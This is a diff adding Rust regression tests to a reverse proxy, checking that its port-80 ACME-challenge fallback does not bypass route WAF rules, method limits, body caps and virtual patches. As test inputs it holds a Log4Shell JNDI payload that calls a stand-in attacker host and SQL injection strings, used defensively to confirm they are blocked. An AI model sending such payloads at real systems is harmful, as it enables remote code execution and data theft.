@@ -5522,3 +5522,349 @@ upstream = "a"
     // One /24 further the table still answers.
     assert_eq!(status(st.clone(), "193.205.1.1").await, 403);
 }
+
+// ── the :80 ACME fallback forwards nothing the HTTPS pipeline would refuse ──
+
+/// What a recording origin saw: (method, path and query, body length).
+type Seen = Arc<Mutex<Vec<(String, String, usize)>>>;
+
+/// An origin that reads every body whole and records what reached it.
+async fn recording_origin() -> (u16, Seen) {
+    let seen: Seen = Arc::new(Mutex::new(Vec::new()));
+    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let port = listener.local_addr().unwrap().port();
+    let s = seen.clone();
+    tokio::spawn(async move {
+        loop {
+            let Ok((stream, _)) = listener.accept().await else {
+                return;
+            };
+            let s = s.clone();
+            tokio::spawn(async move {
+                let svc = hyper::service::service_fn(move |req: Request<hyper::body::Incoming>| {
+                    let s = s.clone();
+                    async move {
+                        let method = req.method().to_string();
+                        let target = req
+                            .uri()
+                            .path_and_query()
+                            .map(|p| p.as_str().to_string())
+                            .unwrap_or_default();
+                        let len = req
+                            .into_body()
+                            .collect()
+                            .await
+                            .map(|b| b.to_bytes().len())
+                            .unwrap_or(usize::MAX);
+                        s.lock().unwrap().push((method, target, len));
+                        Ok::<_, std::convert::Infallible>(Response::new(Full::new(
+                            Bytes::from_static(b"upstream"),
+                        )))
+                    }
+                });
+                let _ = hyper::server::conn::http1::Builder::new()
+                    .serve_connection(TokioIo::new(stream), svc)
+                    .await;
+            });
+        }
+    });
+    (port, seen)
+}
+
+/// A request to `api.example.com` with `method`, an optional content type and a body (with its
+/// `Content-Length` when it is not empty).
+fn api_request(method: &str, uri: &str, ct: Option<&str>, body: Vec<u8>) -> Request<ReqBody> {
+    let mut b = Request::builder()
+        .method(Method::from_bytes(method.as_bytes()).unwrap())
+        .uri(uri)
+        .header("host", "api.example.com");
+    if let Some(ct) = ct {
+        b = b.header("content-type", ct);
+    }
+    if !body.is_empty() {
+        b = b.header("content-length", body.len().to_string());
+    }
+    b.body(Full::new(Bytes::from(body)).map_err(|n| match n {}).boxed())
+        .unwrap()
+}
+
+/// A state with `rest` after the listeners and TLS, `{port}` in it replaced by `port`.
+fn acme_state(port: u16, rest: &str) -> Arc<AppState> {
+    let toml = format!(
+        "[server]\nlisten_http = \"127.0.0.1:0\"\nlisten_https = \"127.0.0.1:0\"\n\
+         [tls]\ncert_path = \"/c\"\nkey_path = \"/k\"\n{}",
+        rest.replace("{port}", &port.to_string())
+    );
+    AppState::for_tests(&toml::from_str::<ZionConfig>(&toml).expect("config parses"))
+}
+
+/// What the upstream received for one request: (method, path and query, body length).
+type Reached = Option<(String, String, usize)>;
+
+/// The status the :80 handler answers `req` with, and what the upstream received for it.
+async fn via_port_80(st: &Arc<AppState>, seen: &Seen, req: Request<ReqBody>) -> (u16, Reached) {
+    let before = seen.lock().unwrap().len();
+    let peer = "203.0.113.9:1".parse::<SocketAddr>().unwrap();
+    let resp = crate::accept::handle_http(req, st.clone(), peer)
+        .await
+        .unwrap();
+    let status = resp.status().as_u16();
+    let _ = resp.into_body().collect().await;
+    (status, seen.lock().unwrap().get(before).cloned())
+}
+
+/// The status the HTTPS pipeline answers `req` with, and what the upstream received for it.
+async fn via_pipeline(st: &Arc<AppState>, seen: &Seen, req: Request<ReqBody>) -> (u16, Reached) {
+    let before = seen.lock().unwrap().len();
+    let peer = "203.0.113.9:1".parse::<SocketAddr>().unwrap();
+    let resp = process_request(req, st.clone(), peer, false).await.unwrap();
+    let status = resp.status().as_u16();
+    let _ = resp.into_body().collect().await;
+    (status, seen.lock().unwrap().get(before).cloned())
+}
+
+/// The plaintext :80 ACME-challenge fallback (`accept::handle_http`) forwards a challenge path
+/// with no live token to the matched route's upstream, outside the HTTPS pipeline. A route with
+/// a WAF profile or restrictions must not be reached that way: the request is redirected to
+/// HTTPS, where they apply. The route is the shipped `examples/multi-site.toml` api route
+/// (host-bound catch-all, `waf_profile = "strict"`, CORS, no auth), plus `methods = ["GET",
+/// "POST"]` and a 1 MiB body cap in the profile.
+///
+/// Each case is first sent through the HTTPS pipeline, which must refuse it (the control: the
+/// payload IS something this route blocks), then through the :80 handler, which must redirect
+/// it and never forward it. Before the fix all six reached the upstream with a 200.
+#[tokio::test]
+async fn the_port_80_acme_fallback_does_not_skip_the_route_waf_and_restrictions() {
+    let (port, seen) = recording_origin().await;
+    let st = acme_state(
+        port,
+        r#"
+[upstreams]
+api = "http://127.0.0.1:{port}"
+
+[waf_profile.strict]
+max_body_mb = 1
+max_depth = 10
+deny_unknown_content_types = true
+
+[[route]]
+hosts = ["api.example.com"]
+path = "/{*rest}"
+upstream = "api"
+waf_profile = "strict"
+methods = ["GET", "POST"]
+cors = { allowed_origins = ["https://app.example.com"], allowed_headers = ["Content-Type", "Authorization"], max_age = 86400 }
+"#,
+    );
+
+    let mut json_big = b"{\"k\":\"".to_vec();
+    json_big.extend_from_slice(&vec![b'a'; 2 * 1024 * 1024]);
+    json_big.extend_from_slice(b"\"}");
+    #[allow(clippy::type_complexity)]
+    let cases: Vec<(&str, &str, &str, Option<&str>, Vec<u8>)> = vec![
+        (
+            "WAF: Log4Shell in the query",
+            "GET",
+            "/.well-known/acme-challenge/x?q=%24%7Bjndi:ldap://attacker.example/a%7D",
+            None,
+            vec![],
+        ),
+        (
+            "WAF: SQLi in the query",
+            "GET",
+            "/.well-known/acme-challenge/x?id=1%27%20OR%201=1--",
+            None,
+            vec![],
+        ),
+        (
+            "WAF: SQLi body with a content type the profile refuses",
+            "POST",
+            "/.well-known/acme-challenge/x",
+            Some("text/plain"),
+            b"id=1' OR 1=1-- ".to_vec(),
+        ),
+        (
+            "WAF body cap: 2 MiB JSON over max_body_mb = 1",
+            "POST",
+            "/.well-known/acme-challenge/x",
+            Some("application/json"),
+            json_big,
+        ),
+        (
+            "route restriction: DELETE, methods = [GET, POST]",
+            "DELETE",
+            "/.well-known/acme-challenge/x",
+            None,
+            vec![],
+        ),
+        (
+            "global method whitelist: TRACE",
+            "TRACE",
+            "/.well-known/acme-challenge/x",
+            None,
+            vec![],
+        ),
+    ];
+
+    let mut leaks = Vec::new();
+    for (label, method, uri, ct, body) in cases {
+        let req = api_request(method, uri, ct, body.clone());
+        let (s443, reached) = via_pipeline(&st, &seen, req).await;
+        assert!(
+            s443 >= 400 && reached.is_none(),
+            "control failed for {label}: :443 answered {s443} or forwarded it"
+        );
+        let (s80, reached) = via_port_80(&st, &seen, api_request(method, uri, ct, body)).await;
+        if s80 != 301 || reached.is_some() {
+            leaks.push(format!(
+                "{label}: :443 refused with {s443}; :80 answered {s80}, the upstream received \
+                 {reached:?}"
+            ));
+        }
+    }
+    assert!(
+        leaks.is_empty(),
+        "the :80 ACME fallback let through {} request(s) the route refuses on :443:\n  {}",
+        leaks.len(),
+        leaks.join("\n  ")
+    );
+}
+
+/// An HTTP-01 validation is a GET with no body (RFC 8555 §8.3). On a route with nothing to
+/// bypass the shortcut forwards that, and a HEAD, and nothing else: another method or a body is
+/// redirected to HTTPS, so the method whitelist and the body cap of a route without a WAF are
+/// not skipped either.
+#[tokio::test]
+async fn the_port_80_acme_fallback_forwards_only_a_bodyless_get_or_head() {
+    let (port, seen) = recording_origin().await;
+    let st = acme_state(
+        port,
+        r#"
+[upstreams]
+api = "http://127.0.0.1:{port}"
+
+[[route]]
+path = "/{*rest}"
+upstream = "api"
+max_body_mb = 1
+"#,
+    );
+    let p = "/.well-known/acme-challenge/tok";
+
+    // forwarded: what a CA sends
+    for method in ["GET", "HEAD"] {
+        let (status, reached) = via_port_80(&st, &seen, api_request(method, p, None, vec![])).await;
+        assert_eq!(status, 200, "{method}");
+        assert_eq!(
+            reached,
+            Some((method.to_string(), p.to_string(), 0)),
+            "{method}"
+        );
+    }
+
+    // control: on :443 the pipeline refuses these two
+    let big = vec![b'a'; 2 * 1024 * 1024];
+    let json = Some("application/json");
+    let (s, _) = via_pipeline(&st, &seen, api_request("POST", p, json, big.clone())).await;
+    assert_eq!(s, 413, "control: the body cap");
+    let (s, _) = via_pipeline(&st, &seen, api_request("TRACE", p, None, vec![])).await;
+    assert_eq!(s, 405, "control: the method whitelist");
+
+    // redirected, never forwarded
+    let cases: Vec<(&str, Option<&str>, Vec<u8>)> = vec![
+        ("POST", json, big),
+        ("POST", json, b"{}".to_vec()),
+        ("GET", json, b"{}".to_vec()),
+        ("PUT", None, vec![]),
+        ("DELETE", None, vec![]),
+        ("OPTIONS", None, vec![]),
+        ("TRACE", None, vec![]),
+    ];
+    for (method, ct, body) in cases {
+        let n = body.len();
+        let (status, reached) = via_port_80(&st, &seen, api_request(method, p, ct, body)).await;
+        assert_eq!(
+            (status, reached),
+            (301, None),
+            "{method} with a {n}-byte body must be redirected, not forwarded"
+        );
+    }
+}
+
+/// The virtual patches (#698) apply to every route, so the shortcut runs them: a request one
+/// of them blocks on :443 is blocked on :80 too, and never reaches the upstream.
+#[tokio::test]
+async fn the_port_80_acme_fallback_runs_the_virtual_patches() {
+    let (port, seen) = recording_origin().await;
+    let st = acme_state(
+        port,
+        r#"
+[virtual_patch]
+enabled = true
+
+[upstreams]
+api = "http://127.0.0.1:{port}"
+
+[[route]]
+path = "/{*rest}"
+upstream = "api"
+"#,
+    );
+    // the rules a `rules_file` would load
+    let rules = crate::virtual_patch::VirtualPatchRules::from_toml_str(
+        "[[rule]]\nid='acme-x-evil'\ncve='CVE-2099-1'\naction='deny'\nmethods=['GET']\n\
+         path_glob='/.well-known/acme-challenge/*'\n[[rule.headers]]\nname='x-evil'\n",
+    )
+    .unwrap();
+    st.virtual_patch.store(Arc::new(rules));
+    let p = "/.well-known/acme-challenge/tok";
+    let evil = || {
+        let mut r = api_request("GET", p, None, vec![]);
+        r.headers_mut().insert("x-evil", "1".parse().unwrap());
+        r
+    };
+    assert_eq!(
+        via_pipeline(&st, &seen, evil()).await,
+        (403, None),
+        "control on :443"
+    );
+    assert_eq!(via_port_80(&st, &seen, evil()).await, (403, None), ":80");
+    // and a request the rule does not match is still forwarded
+    let (status, reached) = via_port_80(&st, &seen, api_request("GET", p, None, vec![])).await;
+    assert_eq!((status, reached.map(|r| r.1)), (200, Some(p.to_string())));
+}
+
+/// Even a plain challenge GET is left to the HTTPS pipeline (redirected, never forwarded) when
+/// the route has something the shortcut does not run: restrictions that refuse it, an inline
+/// WAF, or an upstream with a bulkhead (`max_in_flight`) or a circuit breaker (the shortcut
+/// has no admission stage). The same request on the same route without the setting is
+/// forwarded (the control).
+#[tokio::test]
+async fn the_port_80_acme_fallback_leaves_a_route_with_something_to_bypass_to_https() {
+    let (port, seen) = recording_origin().await;
+    let breaker = "circuit_breaker = { error_rate_pct = 50, min_requests = 5, window_secs = 10, \
+                   open_secs = 30 }";
+    let p = "/.well-known/acme-challenge/tok";
+    for (what, upstream, route) in [
+        ("control", "", ""),
+        ("methods", "", "methods = [\"POST\"]"),
+        ("deny_paths", "", "deny_paths = [\"/.well-known/{*rest}\"]"),
+        ("waf", "", "waf = true"),
+        ("max_in_flight", "max_in_flight = 4", ""),
+        ("circuit_breaker", breaker, ""),
+    ] {
+        let st = acme_state(
+            port,
+            &format!(
+                "[upstream.api]\nurl = \"http://127.0.0.1:{{port}}\"\n{upstream}\n\
+                 [[route]]\npath = \"/{{*rest}}\"\nupstream = \"api\"\n{route}\n"
+            ),
+        );
+        let (status, reached) = via_port_80(&st, &seen, api_request("GET", p, None, vec![])).await;
+        if what == "control" {
+            assert_eq!((status, reached.is_some()), (200, true), "{what}");
+        } else {
+            assert_eq!((status, reached), (301, None), "{what}");
+        }
+    }
+}
